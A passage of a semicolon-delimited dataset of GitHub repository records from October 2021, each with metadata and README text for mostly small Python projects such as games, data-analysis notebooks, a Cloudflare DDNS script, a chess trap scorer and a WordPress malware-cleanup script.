AppleScript cue like so: 'do shell script ""python /path/to/script/smarthubctl.py *input* *output*""' More details can be found here https://blog.allaway.tech/qlab/controlling-blackmagic-design-smart-videohubs-from-qlab/ "
417209743;Instagram-clone;https://github.com/ssanthosh369/Instagram-clone;Python;2021-10-14T16:45:19Z;0;0;0;Instagram-clone A simplified replica of instagram using python and google cloud platform. Users can create posts that must have images and text. users can follow each other and see their posts. A timeline for the posts of a user as wel as the users they follow is also implemeneted. Users can also comment on the posts. 
417306051;RSA-cryptography-from-scratch;https://github.com/petri-98/RSA-cryptography-from-scratch;Jupyter Notebook;2021-10-14T23:01:47Z;0;0;0;"RSA-cryptography-from-scratch Implementing the glorious cryptography algorithm from scratch in Python I created this detailed notebook where I show every single step to build the RSA cryptography algorithm. The notebook includes:  ASCII encoding schemes, to encode a text message into an integer and vice versa; Maths functions needed in the process, with a brief description of each; A routine to find arbitrarily large prime numbers (one of the main steps); The RSA Key generator; The encryption/decryption functions; Two tests.  I hope you will find it clear and useful. -petri "
417198192;eCommerce_Pytest;https://github.com/abiryusuf/eCommerce_Pytest;HTML;2021-10-14T16:09:05Z;1;1;0;
417303913;py-cli-template;https://github.com/caltechlibrary/py-cli-template;Makefile;2021-10-14T22:50:44Z;0;0;0;"%PROJECT_NAME% %PROJECT_DESCRIPTION%.   Table of contents  Introduction Installation Usage Known issues and limitations Getting help Contributing License Authors and history Acknowledgments  Introduction This README file is in Markdown format, and is meant to provide a template for README files as well an illustration of what the README file can be expected to look like.  For a software project, this Introduction section – which you are presently reading – should provide background for the project, a brief explanation of what the project is about, and optionally, pointers to resources that can help orient readers.  Ideally, this section should be short. Installation Begin this section by mentioning any prerequisites that may be important for users to have before they can use your software.  Examples include hardware and operating system requirements. Next, provide step-by-step instructions for installing the software, preferably with command examples that can be copy-pasted by readers into their software environments. For example: a command-line command here Sometimes, subsections may be needed for different operating systems or particularly complicated installations. Usage This Usage section would explain more about how to run the software, what kind of behavior to expect, and so on. Basic operation Begin with the simplest possible example of how to use your software.  Provide example command lines and/or screen images, as appropriate, to help readers understand how the software is expected to be used.  Many readers are likely to look for command lines they can copy-paste directly from your explanations, so it's best to keep that in mind as you write examples. Additional options Some projects need to communicate additional information to users and can benefit from additional sections in the README file.  It's difficult to give specific instructions – a lot depends on your software, your intended audience, etc.  Use your judgment and ask for feedback from users or colleagues to help figure out what else is worth explaining. Known issues and limitations In this section, summarize any notable issues and/or limitations of your software.  If none are known yet, this section can be omitted (and don't forget to remove the corresponding entry in the Table of Contents too); alternatively, you can leave this section in and write something along the lines of ""none are known at this time"". Getting help Inform readers of how they can contact you, or at least how they can report problems they may encounter.  This may simply be a request to use the issue tracker on your repository, but many projects have associated chat or mailing lists, and this section is a good place to mention those. Contributing This section is optional; if your repository is for a project that accepts open-source contributions, then this section is where you can mention how people can offer contributions, and point them to your guidelines for contributing.  (If you delete this section, don't forget to remove the corresponding entry in the Table of Contents too.) License Software produced by the Caltech Library is Copyright © %CREATION_YEAR% California Institute of Technology.  This software is freely distributed under a BSD/MIT type license.  Please see the LICENSE file for more information. Authors and history In this section, list the authors and contributors to your software project.  Adding additional notes here about the history of the project can make it more interesting and compelling.  This is also a place where you can acknowledge other contributions to the work and the use of other people's software or tools. Acknowledgments This work was funded by the California Institute of Technology Library.       "
417243570;filedep;https://github.com/flcong/filedep;Python;2021-10-14T18:36:41Z;0;0;0;"filedep: A small python tool to check file dependency Motivation When doing empirical analysis, you may encounter the following issue about file dependency.   Suppose code.py (or code.do, code.sas, code.m, code.R, etc) reads data from indata.csv, does some data cleaning, and then saves the intermediary data as outdata.csv.   After using outdata.csv to run some statistical tests, you want to change the data cleaning procedure a bit, so you modify code.py.   If there are only one code file and two data files, you will easily remember to re-run code.py to update the output data outdata.csv.   However, suppose that outdata.csv is then used by code2.py to write finaldata.csv. Then, people may easily forget to re-run code2.py as well to update finaldata.csv.   As a result, this may cause the illusion that results change after you run the same set of code twice. For example, you forget to update finaldata.csv initially, but then accidentally update finaldata.csv some time later. Then, you find that results change after you run the same set of code.   To resolve this issue, I build this simple package to check file dependencies based on last modified time. Users can define file dependencies, such as code.py using pre1.csv and pre2.csv as input to write post1.csv and post2.csv. Then, the function in the package will check if the last modified times of both pre1.csv and pre2.csv are before that of code.py and the last modified times of both post1.csv and post2.csv are after that of code.py. If any file dependency is broken, the broken ones will be printed or saved to a file. Installation Use pip to install the package as follows: pip install filedep Usage Import the package using import filedep The key function is check_dep(deps, outfile=sys.stdout, reterr=False). The first argument is a list of dependencies (defined below). The second argument specifies where to print error information if any file dependency is broken. The default is sys.stdout. The third argument specifies if broken dependencies are returned from the function. This is mainly for testing purposes. The default is False, i.e., broken dependencies are only printed. The file dependencies have to be provided by the user using the format defined below. In the template folder, there is a template to define dependencies and use check_dep() function to check. Example 1. No broken file dependencies The following code creates several empty files: import filedep import time import os from os.path import join as pj  PATH = r'C:\test_check_dep' if not os.path.exists(PATH):     os.mkdir(PATH)  def touch(filepath):     if os.path.exists(filepath):         os.utime(filepath)     else:         with open(filepath, 'a') as f:             pass  # Touch files in a specific order touch(pj(PATH, 'pre11.csv')) time.sleep(.1) touch(pj(PATH, 'pre12.csv')) time.sleep(.1) touch(pj(PATH, 'code1.py')) time.sleep(.1) touch(pj(PATH, 'post11.csv')) time.sleep(.1) touch(pj(PATH, 'post12.csv')) time.sleep(.1)  # Define dependencies deps = [     (         [             pj(PATH, 'pre11.csv'),             pj(PATH, 'pre12.csv')         ],          pj(PATH, 'code1.py'),          [             pj(PATH, 'post11.csv'),             pj(PATH, 'post12.csv'),         ],     ), ] filedep.check_dep(deps) In deps, we define a single dependency as follows: under the directory C:\test_check_dep, code1.py reads pre11.csv and pre12.csv to produce post11.csv and post12.csv. Then, the last modified times of both pre11.csv and pre12.csv must be before that of code1.py and those of both post11.csv and post12.csv must be after that of code1.py Since the dependency is satisfied by construction, the output is All file dependencies are verified!  Example 2. Broken file dependencies The following code creates several empty files and define two broken dependencies: import filedep import time import os from os.path import join as pj  PATH = r'C:\test_check_dep' if not os.path.exists(PATH):     os.mkdir(PATH)  def touch(filepath):     if os.path.exists(filepath):         os.utime(filepath)     else:         with open(filepath, 'a') as f:             pass  # Touch files in a specific order touch(pj(PATH, 'pre11.csv')) time.sleep(.1) touch(pj(PATH, 'pre12.csv')) time.sleep(.1) touch(pj(PATH, 'code1.py')) time.sleep(.1) touch(pj(PATH, 'post11.csv')) time.sleep(.1) # Note code1.py is newer than post11.csv touch(pj(PATH, 'code1.py')) time.sleep(.1) touch(pj(PATH, 'post12.csv')) time.sleep(.1)  # Define dependencies deps = [     (         [             pj(PATH, 'pre11.csv'),         ],          pj(PATH, 'code1.py'),          [             pj(PATH, 'post11.csv'),         ],     ),       (         [             pj(PATH, 'pre11.csv'),             pj(PATH, 'pre12.csv'),         ],          pj(PATH, 'code1.py'),          [             pj(PATH, 'post11.csv'),              pj(PATH, 'post12.csv'),         ],     ) ] filedep.check_dep(deps) Here, we define 2 dependencies. The second one is the same as that in the previous example, but the first one defines a simpler dependency: code1.py uses pre11.csv to produce post11.csv. Since by construction post11.csv is ""touched"" before code1.py, both dependencies are broken. Hence, the output is There are 2 broken file dependencies!!!  [1]                                            Last Modified Time   Input:     C:\test_check_dep\pre11.csv      : 2021-10-14 14:25:11.011976   Code:     C:\test_check_dep\code1.py       : 2021-10-14 14:25:11.451668   Output:     C:\test_check_dep\post11.csv     : 2021-10-14 14:25:11.342247 [2]                                            Last Modified Time   Input:     C:\test_check_dep\pre11.csv      : 2021-10-14 14:25:11.011976     C:\test_check_dep\pre12.csv      : 2021-10-14 14:25:11.125543   Code:     C:\test_check_dep\code1.py       : 2021-10-14 14:25:11.451668   Output:     C:\test_check_dep\post11.csv     : 2021-10-14 14:25:11.342247     C:\test_check_dep\post12.csv     : 2021-10-14 14:25:11.559796  where the last modified date of each file in each broken dependency is shown. Format of file dependency The first argument of check_dep() is a list of dependencies. Its format should be as follows:  It is a list of tuples. Each tuple has three elements.  The first element is a list of str. The second element is a str. The third element is a list of str. Each str is an absolute path of a existing file.    As an example, the following code defines two dependencies: deps = [     (         ['pre1.txt'], 'code1.py', ['post1.txt']     ),     (         ['pre21.txt', 'pre22.txt'], 'code2.py', ['post21.txt', 'post22.txt']     ) ]  The first one says that code1.py uses pre1.txt as input and outputs post1.txt. As a result, the last modified date of the three files should satisfy pre1.txt<=code1.py<=post1.txt. The second one says that code2.py uses pre21.txt and pre22.txt as input and outputs post21.txt and post22.txt. As a result, the last modified date of the three files should satisfy max(pre21.txt,pre22.txt)<=code1.py<=min(post21.txt,post22.txt) where max (min) represent the maximum (minimum) date.  "
417199255;miningpoolhub-py;https://github.com/CoryKrol/miningpoolhub-py;;2021-10-14T16:12:12Z;0;0;0;miningpoolhub-py A Python wrapper for the Mining Pool Hub REST API 
417207747;BasicOpenCV;https://github.com/mteeratat/BasicOpenCV;Python;2021-10-14T16:39:08Z;0;0;0;BasicOpenCV practice Python OpenCV for face detection in video clip 
417292677;jogo-jokenpo;https://github.com/gabriel-limaf/jogo-jokenpo;Python;2021-10-14T21:54:28Z;0;0;0;
417293660;RavePy;https://github.com/Slenderman00/RavePy;Python;2021-10-14T21:59:13Z;0;0;0;RavePy Python framework for analyzing music in real time 
417283465;TicTacToe;https://github.com/ishpreet95/TicTacToe;Python;2021-10-14T21:11:10Z;0;0;0;TicTacToe A small project built in Python using Tkinter package. 
417255403;drone-programming-;https://github.com/Lilyaddy15/drone-programming-;Python;2021-10-14T19:18:52Z;0;0;0;
417289989;Basic-Calc;https://github.com/j0n1s/Basic-Calc;Python;2021-10-14T21:41:42Z;1;1;0;
417265954;sudokuf;https://github.com/oatley/sudokuf;Python;2021-10-14T19:59:37Z;0;0;0;
417305315;chess-trap-scorer;https://github.com/davidADSP/chess-trap-scorer;Jupyter Notebook;2021-10-14T22:58:26Z;0;0;0;                 Chess Trap Scorer                         ·     Report Bug     ·     Request Feature    Table of Contents   About The Project   Getting Started  License Contact Acknowledgements    About The Project  This project allows you to score trappy chess openings, based on two factors: 🎲 Probability How likely is the player to play the next move in the trap sequence? A good trap should have a high likelihood that the next move in sequence is commonly chosen. 😵 Potency How likely is the player to lose after they have fallen into the trap? A good trap should be deadly once your opponent has fallen into it!  🎯 Trap score The trap score for a given pgn input is the product of these two scores. For more information, see the accompanying blog post. Have fun!  Getting Started To get a local copy up and running, follow these simple steps. Installation  Clone the repo git clone https://github.com/davidADSP/chess-trap-scorer.git cd chess-trap-scorer  Pip install requirements (inside a virtual environment) pip install -r requirements.txt   Quickstart To score a given opening, simply use the following command, with the pgn of your choice. python3 solver.py --pgn '1. e4 e5 2. Nf3 Nf6 3. Nxe5 Nc6 4. Nxc6 dxc6 5. d3 Bc5 6. Bg5' The lichess opening API is used to gather data for the analysis. No token is required. The config.py file allows you to change the variant, speeds and rating range of the analysis, as well as the number of moves to search over to find the best follow up move and the alpha of the potency confidence interval. Output The output is the following summary (shown here with descriptive labels): Black to play <- The colour of the player who will take advantage of the trap Total moves:	 6 <- Number of moves played by the opponent 	e4:	        64.02% <- The likelihood that the opponent plays this required move 	Nf3:	    66.17% 	Nxe5:	    34.16% 	Nxc6:	    84.17% 	d3:	        38.70% 	Bg5:	    14.63% Likelihood:	    0.69% <- The product of the likelihoods Frequency:	    Every 145 games <- 1 / likelihood Av Move Prob:   43.63% <- Geometric mean of the move probabilities  Continuation:	Nxe4 <- Best move that takes advantage of the trap Total games:	1670 <- Number of lichess games where this move has been played Shock:		    +43.21% (52.42% -> 95.63%) <- The delta of the win likelihood before and after this move Potency:	    95.63% CI ['94.65%', '96.61%'] (95%) <- The % chance of winning after this move with confdience interval  Trap Score:		    41.72% ( = 43.63% * 95.63% ) <- the product of the Av Move Prob and Potency  The higher the trap score, the better the trap! Jupyter notebook A jupyter notebook traps.ipynb is also provided, where a view of the board is also rendered.  License Distributed under the MIT License. See LICENSE for more information.  Contact David Foster - @davidADSP - david@adsp.ai Project Link: https://github.com/davidADSP/chess-trap-scorer  Acknowledgements Thanks to all the great chess content creators out there - here's three of the best:  GothamChess Agadmator Eric Rosen   
417207969;Chess;https://github.com/Atharva7007/Chess;Python;2021-10-14T16:39:51Z;0;0;0;Chess Implementation of 2-player chess using the Python library Pygame 
417240847;Criptografia;https://github.com/Evellyn-Pereira/Criptografia;Python;2021-10-14T18:27:11Z;1;1;0;Criptografia Cifrar documentos com textos e decifrar em Python. 
417238739;QuizGameGUI;https://github.com/Chloester2021/QuizGameGUI;Python;2021-10-14T18:19:59Z;0;0;0;
417211106;dice;https://github.com/pratik29046/dice;Python;2021-10-14T16:49:43Z;0;0;0;dice using python random-function, for-loop, while-loop 
417209223;pong_local_multiplayer;https://github.com/shuklansh/pong_local_multiplayer;Python;2021-10-14T16:43:48Z;0;0;0;pong_local_multiplayer classic pong game using python ( turtle ), local 2 player use w and s for player 1 use i and k for player 2 (use python3 for running the game) features: 1.score tally for player 1 and 2 updated after each round end 2.new round starts with the ball going the way of loser 
417200711;multidbutils;https://github.com/shriyashwarghade/multidbutils;;2021-10-14T16:16:48Z;0;0;0;multidbutils Python package for Exporting, Importing, Sync multiple Databases. 
417273509;pong-game;https://github.com/Lilyaddy15/pong-game;Python;2021-10-14T20:29:58Z;0;0;0;
417271142;Titanic_Survival_Check_Kaggle;https://github.com/yyash/Titanic_Survival_Check_Kaggle;Python;2021-10-14T20:20:23Z;0;0;0;
417199339;Computer-Configuration;https://github.com/PranavG71004/Computer-Configuration;Python;2021-10-14T16:12:26Z;0;0;0;Computer-Configuration Python Assignment - Configuring a Computer 
417261974;Project-Zookeeper;https://github.com/l0ngst4r/Project-Zookeeper;Python;2021-10-14T19:44:07Z;0;0;0;"Project-Zookeeper first project of Python Basics by JetBrains Academy Stage 1: Description One of the most important parts of working with animals is keeping an eye on them. We need to see the animals on the screen to know how they are doing, right? Now we are ready to print something awesome: an image of an animal! Objectives For the second stage, you will need to develop an animal printer. Your program should display the animal identified in the code field. Please, don't remove the r character at the start of the code template. It's a part of the string and it's important. So, the string should start with r"""""" sequence. This “r” at the beginning stands for “raw” and allows various characters to be used in a string without escaping. For instance, “\” in a non-raw string should be escaped as follows: “\”. Stage 2 (current): Description Now it's time to make our project user-friendly. In this final stage, you'll make your software ready for the zoo staff to use. Your program should understand the habitat numbers, show the animals, and be able to work continuously without having to be restarted. Objectives Your tasks at this point: Your program should repeat the behavior from the previous stage, but now in a loop. Do not forget to include an exit opportunity: inputting exit should end the program. When the program is done running, it should print: See you later! "
417219745;CFDDNS;https://github.com/acmpesuecc/CFDDNS;Python;2021-10-14T17:16:11Z;0;0;3;"DDNS Using CloudFlare Getting started CloudFlare is a really good service to use as you dns, sadly they dont provide service for pointing your statc dns at your dynamic IP , everyone deserves a domain without that ""ddns"" in thier domain. Now , Using this python script you can get your self a cheap domain name, use cloudflare as DNS and make it works like a DDNS!. Altho this does take up some work from your side , like setting up a ./src/.env file with this structure : KEY=<api key> ZONE=<domain zone> ID=<domain id> EMAIL=<email assosiated with cloudflare> NAME=<domain name> TYPE=<domain type>  NOTE : ofc the env file should NOT have <> surrouding those values IP API The API being used for ip change detection : https://www.ipify.org/ Surprise Surpise , this website claim 99% uptime with unlimited requests!!! I also wanted to include some traceroute method for ip changin , maybe soon. NOTE : I still havent handled all exceptions like no internet connection , I will add these soon "
417282596;TelegramBotOnTelebot;https://github.com/threebaddots/TelegramBotOnTelebot;Python;2021-10-14T21:07:25Z;0;0;0;TelegramBotOnTelebot test task #1 from asmgen. Simple telegram bot that answer on user messages and ask user about his name, surname and age. 
417267479;game_sales_analysis;https://github.com/Lang-Jonathan/game_sales_analysis;Jupyter Notebook;2021-10-14T20:05:21Z;0;0;0;Game Sales Analysis Project description In this project the fictive online store Ice sells video games all over the world. Based on a open source dataset which contains user- and expert reviews, genres, gaming platforms (e.g. Xbox or PlayStation), and historical data up to 2016 a extensive data analysis should be carried out in preparation for the campaign for 2017. For this campaign patterns that determine whether a game succeeds or not should be identified, which will allow ice to spot potential big winners and plan advertising campaigns. Project Steps  Within this project the data has been preprocessed:  Filling missing values Cathegorizing Adjusting datatypes Dropping unusable rows   An analysis has been carried out:  Investigating the platfroms lifespan, behaviour over time, How different markets influence sales and genre sbstitution The influence of different genres on sales The influence of age ratings on sales The influence of user and professional ratings on total sales How different platforms and ratings as well as their distribution differs    Outcomes For the campaign for 2017 we recommend to start a campaign which full fills the following criteria:  Platform: PS4 (PC and XOne can also be considered) genre: Action, shoter or sport Both ratings (professional and user) should be collected for (if done) beta testing Age rating: M But beside of thos factors, it should maybe considered to develop a campagin for a game for the next generation of consoles (PS5 / Xbox X) because the newest verions are aleady 4-5 Years on the market and already crossed their top of sales (at least if the trend is continuing as expected and there is nothing in the data what shows the opposite)  Maybe it would also be interessting to investigate mobile games which basically killed the handheld platforms around 2010 (except 3DS) 
417278128;csv_pokeapi;https://github.com/kiramishima/csv_pokeapi;Python;2021-10-14T20:49:17Z;0;0;0;CSV Pokeapi Run Local  pip install -r requirements.txt export FLASK_APP=hello flask run Open in your browser -> http://localhost:5000  Run Docker  Build the image -> docker build -t pokeapi . Run the container -> docker run -p 5001:5000 -d pokeapi Open in your browser -> http://localhost:5001  
417283561;AiogramTelegramBot;https://github.com/threebaddots/AiogramTelegramBot;Python;2021-10-14T21:11:30Z;0;0;0;AiogramTelegramBot test task #2 from asmgen. this telegram bot performs the same function as TelegramBotOnTelebot, but he works on aiogram framework. 
417291838;data-generator;https://github.com/willy-r/data-generator;Python;2021-10-14T21:50:42Z;0;0;0;Data Generator Gere dados para você poder fazer consultas no seu banco de dados! Script feito para gerar arquivos .sqls com dados para poder fazer consultas usando o SELECT, às vezes é chato gerar dados para poder fazer consultas, então esse script automatiza esse processo. Instalação Você precisa ter o Python 3.9+, instale as dependências com pip install -r requirements.txt e execute o seguinte comando: python3 generator.py quantity  quantity é a quantidade de tuplas que serão geradas, o máximo é 5000 e se não for passado o padrão é 5000.  Exemplo python3 generator.py 5 Resultado  Se divirta com as consultas! 
417290448;Atividades_IFPE_EstruturasCondicionais;https://github.com/Jonas-petty/Atividades_IFPE_EstruturasCondicionais;Python;2021-10-14T21:43:43Z;0;0;0;
417242524;dio-cognizant-analise-dados-2021;https://github.com/vichShir/dio-cognizant-analise-dados-2021;Jupyter Notebook;2021-10-14T18:32:59Z;0;0;0;DIO - Análise de dados com Python e Pandas 🐼    📃 Descrição Repositório do Curso Introdutório de Python para análise de dados com Python e Pandas da Digital Innovation One do bootcamp Cognizant Cloud Data Engineer 2021. Assuntos abordados neste curso:  Python Básico Estrutura de dados Introdução a Biblioteca Pandas Trabalhando com arquivos em Excel Trabalhando com Datas Visualização de dados Análise Exploratória de dados  📚 Conteúdo  Dados Notebook de cada assunto abordado  🌐 Motivação O projeto compõe o desafio de projeto do curso Análise de dados com Python e Pandas na Digital Innovation One do bootcamp Cognizant Cloud Data Engineer (2º Semestre 2021). 
417296480;handyblackjack;https://github.com/antogno/handyblackjack;Python;2021-10-14T22:12:09Z;0;0;0;HandyBlackjack      HandyBlackjack is a Single-Deck Blackjack hand generator and calculator.  Installation Use the package manager Pip to install HandyBlackjack. pip install HandyBlackjack Usage import HandyBlackjack HandyBlackjack.generate_cards() # Returns two random cards with their value. # For example: # { #     'card_one': { #         'value': '10', #         'suit': 'H', #     }, #     'card_two': { #         'value': '4', #         'suit': 'S', #     }, #     'points': 14 # } HandyBlackjack.calculate_points(['A', '6']) # Return: 17 License HandyBlackjack is licensed under the terms of the Creative Commons Zero v1.0 Universal license. For more information, see the Creative Commons website. 
417214158;enaml-studio;https://github.com/Kochise/enaml-studio;Python;2021-10-14T16:59:11Z;0;0;0;enaml-studio enaml ui builder with live wysiwyg editor 
417228909;p21-script;https://github.com/aktin/p21-script;Python;2021-10-14T17:46:44Z;0;0;0;p21-script A Python script to import inpatient treatment data according to § 21 KHEntgG into the AKTIN DWH Installation   Put Python script on running AKTIN DWH server in /var/lib/aktin/import-script/   Restart Server   Import script should be visible in view of AKTIN DWH (only Version >= 1.4)   Import script for P21-Data is also included in dwh-update   
417271034;Covid19;https://github.com/elham-farahmand/Covid19;Jupyter Notebook;2021-10-14T20:19:55Z;0;0;0;"Covid19 Data analysis with python using Pandas data frame: Covid 19 dataset  Course project of ""Big Data Analysis With Pandas Data Frame"" in Udemy   Show the number of confirmed, deaths, and recovered cases in each region. In which region maximum number of confirmed cases were recorded? In which region minimum number of deaths were recorded? How many confirmed, deaths, and recovered cases were reported for Canada? Remove all the records where confirmed cases are less than 10.  "
417259549;Juego-tres-en-raya;https://github.com/JoseFernando7/Juego-tres-en-raya;Python;2021-10-14T19:34:34Z;0;0;0;
417295123;Multi-Colored-Star-;https://github.com/Sean4478/Multi-Colored-Star-;;2021-10-14T22:05:44Z;0;0;0;Multi Colored Star Using the Python Programming Language to create a Multi Colored Star with turtle. 
417246920;FastAid-Kivy;https://github.com/Srija03/FastAid-Kivy;Python;2021-10-14T18:48:51Z;0;0;0;FastAid-Kivy Developing a first aid app for mobile using python, kivy and kivy md 
417235029;HospitalManagement-System;https://github.com/deepthijaya/HospitalManagement-System;;2021-10-14T18:07:18Z;0;0;0;
417305230;2D-Level-Editor;https://github.com/sb3-spec/2D-Level-Editor;Python;2021-10-14T22:57:57Z;1;1;0;
417220675;LeetCodeStudy;https://github.com/HannahWlasowicz/LeetCodeStudy;Python;2021-10-14T17:19:12Z;0;0;0;LeetCodeStudy A python script that gives me random leetcode questions from a Google Sheet How to run Once you donwload the code run the command python study.py It will prompt you for the number of easy, medium and hard questions you want. It will open one question at a time starting with easy -> medium -> hard. Future plans  I hope to add a category feature which will let you study questions from a given category Add in a hint/tips command that will print out the notes from the spreedsheet Have a section for Blind75 questions or choose between LeetCode patterns and Blind75  Note This is ment for people to use however they wish. The main objective is to get better at studying LeetCode problems. I did not make this list, it is taken from LeetCode Patters. I thank them for helping make studying 10 times easier 
417238736;rock_paper_scissors_game;https://github.com/farsi81/rock_paper_scissors_game;Python;2021-10-14T18:19:59Z;0;0;0;rock_paper_scissors_game creating rock_paper_scissors_game for developing my skills by python :) 
417285160;Temp-Converter;https://github.com/GreenAppleCode/Temp-Converter;Python;2021-10-14T21:18:47Z;0;0;0;
417281696;Making-savings-calculator-with-Maya;https://github.com/Mohasin-Haque/Making-savings-calculator-with-Maya;Python;2021-10-14T21:03:43Z;0;0;0;
417313590;Jogo-da-Velha;https://github.com/vagneto/Jogo-da-Velha;Python;2021-10-14T23:43:55Z;0;0;0;Jogo-da-Velha Um joginho de jogo da velha em python. Parte dos meus estudos. 
417260031;P4_Tournament_manager;https://github.com/MatthLC/P4_Tournament_manager;;2021-10-14T19:36:28Z;0;0;0;
417264879;cc_to_vtt;https://github.com/AndreasGocht/cc_to_vtt;Python;2021-10-14T19:55:42Z;0;0;0;
417285313;WPCure;https://github.com/profitrollgame/WPCure;Python;2021-10-14T21:19:30Z;0;0;0;WPCure Small python script to identify and eliminate some types of WordPress & PHP malware. END PLAY Studio team created this script to fight some types of PHP malwares on the server. This piece of code might (or might not) be useful to fight this specific kinds of malware. Installation Use python3 and pip3 instead if you have Python3 and Python2 installed separately. We also highly recommend using sudo with wpcure to make sure that script has access to all needed files. This also means that you should double check every change you make into your site and have some kind of backup. git clone https://github.com/profitrollgame/WPCure  cd WPCure  pip install -r requirements.txt  python wpcure.py  
417218020;AnalistaDeDados;https://github.com/nathaliabacalhau27/AnalistaDeDados;;2021-10-14T17:10:47Z;0;0;0;
417315265;deploydb;https://github.com/mertguvencli/deploydb;Python;2021-10-14T23:53:36Z;1;1;0;"deploydb Deploy your database objects automatically when the git branch is updated.  Production-ready! ⚙️ Easy-to-use 🔨 Customizable 🔧  Installation Install the latest package. pip install deploydb Usage 1- Create configuration file ( json file or dict )    Property Description     local_path where the local repository will be located   https_url or ssh_url address to be listen   target_branch branch to handle changes   servers a list of server credentials    Example: config.json {     ""local_path"": """",     ""https_url"": """",     ""ssh_url"": """",     ""target_branch"": """",     ""servers"": [         {             ""driver"": ""ODBC Driver 17 for SQL Server"",             ""server"": ""server-address-or-instance-name"",             ""server_alias"": ""Staging"",             ""user"": ""your-username"",             ""passw"": ""your-password""         }     ] } 2- Listener will listen every changes with sync method. from deploydb import Listener  deploy = Listener('config.json') deploy.sync(loop=True) Repo Generator If you does not have any existing repository. You can easily export your database objects then create your repository. from deploydb import RepoGenerator  generator = RepoGenerator(config=""config.json"", export_path=""path-to-export"") generator.run() RepoGenerator will extract objects structure as below. path-to-export │ └───Server-X     │    └───DB-X     │    │   └───Tables     │    │   └───Views     │    │   └───Functions     │    │   └───Stored-Procedures     │    │   └───Triggers     │    │   └───Types     │    │   └───DMLs     │    │   └───DDLs     |    |     │    N-Database     N-Server  (TODO) Creating a Windows Service "
417202861;crypto-bot;https://github.com/nilsbecker0711/crypto-bot;;2021-10-14T16:23:07Z;0;0;0;crypto-bot This is hobby project of a crypto trading bot in Python 
417300398;Discord-Message-Components;https://github.com/PolarsBear/Discord-Message-Components;Python;2021-10-14T22:32:28Z;0;0;0;"Discord Message Components A python library that adds message component support to discord bots Usage I will add proper documentation very soon from discord_message_components import * from discord.ext.commands import Bot import discord  bot = Bot(""prefix"")  components = ComponentHelper() button = Button(""visible label"", 1, ""custom_id"") components.addComponent(button)  @bot.event async def on_socket_raw_receive(msg):     interaction = await websocket_wrap(msg)     if interaction is not None: # Making sure the interaction actually happened and was for message components         await respond(interaction,f""{interaction.member_data.username} clicked button {components.getFirstComponent(interaction.data.custom_id)}"") # This acts just like discord_message_components.send_message, except it requires an interaction, and cannot have a message reference  @bot.command() async def mycommand(ctx):     await send_message(ctx.channel,""content"",components=components)  config.token = ""My Token"" #the token is required for sending the messages with components "
417235883;Inventario_Sony;https://github.com/M-Narvaez/Inventario_Sony;CSS;2021-10-14T18:10:09Z;0;0;0;
417246432;mml-in-action;https://github.com/nguyenvlm/mml-in-action;;2021-10-14T18:47:10Z;0;0;0;mml-in-action A Python module implementing the beautiful maths in the mml-book 
417220725;remove-duplicate-emails;https://github.com/MeghanPund/remove-duplicate-emails;Python;2021-10-14T17:19:21Z;0;0;0;remove-duplicate-emails A short Python program to compile email lists and remove duplicate emails. 
417284953;UnivespPJI110Blog;https://github.com/mflavioep/UnivespPJI110Blog;HTML;2021-10-14T21:17:53Z;0;0;0;UnivespPJI110Blog 
417316603;electronic-paper-display;https://github.com/dylanfisher/electronic-paper-display;Python;2021-10-15T00:00:53Z;0;0;0;Electronic Paper Display Hardware  800×480, 7.5inch E-Ink display HAT for Raspberry Pi Raspberry Pi Zero WH  Inspiration The inspiration and initial code for this project comes from this project: https://github.com/TomWhitwell/SlowMovie 
417206053;TIC-TAC-TOE;https://github.com/Abhi15599/TIC-TAC-TOE;Python;2021-10-14T16:33:26Z;0;0;0;TIC-TAC-TOE TIC TAC TOE game is made in python using pygame,  numpy 
417210506;MonteCarlo-E-Value_MultiThread;https://github.com/mehmethalis/MonteCarlo-E-Value_MultiThread;Python;2021-10-14T16:47:46Z;0;0;0;
417259066;p4d-slack-trigger;https://github.com/fabiomotoca/p4d-slack-trigger;Python;2021-10-14T19:32:38Z;0;0;0;"Helix Core Python Trigger (p4d-slack-trigger) A Python trigger to send messages into slack when users commit changes. How To Use  Save the .py file in a directory that perforce user have access Set the +x to the file 'chmod +x p4d-slack-trigger.py' Install the requeired libraries (json, requests) Change the variables values 'POST_URL' and 'CHANNEL' Use 'p4 triggers' to configure the trigger like the example below  p4d-slack-trigger change-submit //depot/... ""/p4/p4d-slack-trigger.py %serverport% %change% %user%""  "
417261406;Asistente-de-voz;https://github.com/charlieyhs/Asistente-de-voz;;2021-10-14T19:42:01Z;0;0;0;
417271667;Vitals7;https://github.com/x04000/Vitals7;;2021-10-14T20:22:19Z;0;0;0;Alpha of Vitals7 There only an Alpha and don't have the inst and script finished. He actually only contain the input! 
417299692;EPA-Ecoregions-Point-in-Polygon;https://github.com/haberkornm/EPA-Ecoregions-Point-in-Polygon;Jupyter Notebook;2021-10-14T22:28:49Z;0;0;0;EPA-Ecoregions-Point-in-Polygon Python function for identification of EPA ecoregions level 1, 2, and 3 from latitude and longitude. 
417278759;CrappyCropper;https://github.com/daviddavo/CrappyCropper;Python;2021-10-14T20:51:52Z;0;0;0;CrappyCropper A Python program to crop lots of images easily mainly using keyboard 
417290671;WomenInData-Guatemala2021;https://github.com/alcazar90/WomenInData-Guatemala2021;;2021-10-14T21:44:50Z;0;0;0;"    Women in Data: Guatemala Chapter Visualización de datos con Python    Material de mi presentación en Women in Data: Guatemala Chapter realizada el 13/10/2021. Notebook en Google Colab con la implementación en python 🐍 de las visualizaciones de la presentación y material adicional. Para verlo solo debes hacer clic en el banner de abajo ""Open in Colab"":    Slides de la presentación aquí. Comentarios o preguntas aquí. Acerca de la presentación:  El objetivo de la presentación fue exponer ideas y conceptos sobre la visualización de datos que las y los nuevos practicantes deben dominar en su transición a usuarios más avanzados. Conceptos como los de diseñar una visualización por capas, identificar el rol de las anotaciones como un elemento esencial para facilitar la lectura de la visualización a la audiencia, y la adopción de buenas prácticas para evitar errores comunes.  Visualizaciones Haz clic para expandir y ver algunas de las principales visualizaciones expuestas en la presentación. El código para cada una de las visualizaciones se encuentra en el notebook.   Parte 1: mapa de calor y cantidades en el tiempo      Parte 2: creando una visualización por capas     Parte 3: la sequía y los colores   Recursos utilizados en la presentación:   Fundamentals of Data Visualization - Claus O. Wilke (2019)   The Evolution of a ggplot (Ep. 1) (Cédric Scherer): la parte 2 de la presentación se basa en este post   Colors and Emotions in Data Visualization (Cédric Scherer)   The Python Graph Gallery  Se muestra como ejemplo la visualización que aparece en el post ""Palmer Penguins exploration with violinplots in Matplotlib""    Artículos públicados por The New York Times mencionados en la presentación:   Se utiliza como ejemplo el barplot 